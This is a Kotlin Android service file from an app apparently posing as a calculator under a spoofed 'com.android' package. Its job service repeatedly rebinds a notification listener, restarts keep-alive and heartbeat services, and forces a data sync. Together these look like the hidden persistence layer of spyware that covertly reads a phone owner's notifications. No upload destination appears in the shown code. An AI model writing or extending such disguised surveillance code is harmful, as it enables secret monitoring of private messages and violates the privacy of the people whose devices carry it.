package com.android.mycalculator
import android.app.job.JobParameters
import android.app.job.JobService
import android.content.ComponentName
import android.content.Intent
import android.os.Build
import android.service.notification.NotificationListenerService
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class BackupJobService : JobService() {
    
    override fun onStartJob(params: JobParameters?): Boolean {
        // This runs when system wakes up device for maintenance
        
        // 1. Check if services are running
        val enabledListeners = android.provider.Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )
        
        val isListenerRunning = enabledListeners != null && enabledListeners.contains(packageName)
        
        if (!isListenerRunning) {
            // Rebind notification listener
            val componentName = ComponentName(this, NotificationService::class.java)
            NotificationListenerService.requestRebind(componentName)
        }
        
        // 2. Start all services to be safe
        startService(Intent(this, NotificationService::class.java))
        startService(Intent(this, KeepAliveService::class.java))
        startService(Intent(this, HeartbeatService::class.java))
        
        // 3. Force a sync
        val syncWork = OneTimeWorkRequestBuilder<SyncWorker>()
            .setInitialDelay(5, TimeUnit.SECONDS)
            .build()
        WorkManager.getInstance(this).enqueue(syncWork)
        
        // Tell system we're done
        jobFinished(params, false)
        return true
    }
    
    override fun onStopJob(params: JobParameters?): Boolean {
        // Called if job is cancelled before finishing
        return true // Reschedule
    }
}
